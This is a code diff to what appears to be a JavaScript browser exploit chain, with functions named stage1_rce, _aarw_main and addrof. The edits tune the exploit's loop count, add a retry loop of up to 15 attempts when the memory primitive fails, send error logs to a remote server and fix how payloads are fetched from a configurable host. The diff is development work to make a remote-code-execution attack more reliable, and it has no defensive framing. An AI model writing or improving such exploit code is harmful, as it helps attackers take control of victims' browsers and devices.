@@ -17,8 +17,7 @@ let logStart = new Date().getTime();
 let logEntryID = 0;
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
-    try { self.postMessage({ type: 'log', text: out }); } catch(e) {}
-    if (!SERVER_LOG) return;
+    if (!SERVER_LOG && !reportError) return;
     let obj = {
         id: logEntryID++,
         text: out,
@@ -37,7 +36,7 @@ function print(x, reportError = false, dumphex = false) {
       try 
       {
           let url = "";
-          url = host + "/" + fname;
+          url = host + (fname.startsWith('/') ? fname : '/' + fname);
           print("trying to fetch from:" + url);
           let xhr = new XMLHttpRequest();
           xhr.open("GET", `${url}` , false);
@@ -8797,7 +8796,7 @@ async function _aarw_main() {
         function _make_stage1(util, p_rce) {
             let run = exp();
             
-            const N = 30; // tunable count
+            const N = 50; // tunable count
             for (let i = 0; i < N; ++i) {
                 try {
                     run(util, p_rce);
@@ -10191,11 +10190,10 @@ async function main() {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
             print("inside stage1_rce from worker");
-            main().then((p_temp) => {
+            main().then(async (p_temp) => {
               if(!p_temp.addrof)
               {
-                print("Failed rce, retrying if possible");
-                main();
+                let retryCount = 0; const maxRetries = 15; while(retryCount < maxRetries && !p_temp.addrof) { print("Failed rce, retry " + (retryCount+1) + "/" + maxRetries); p_temp = await main(); retryCount++; } if(!p_temp.addrof) { print("All retries exhausted"); }
               }
             });
             break;
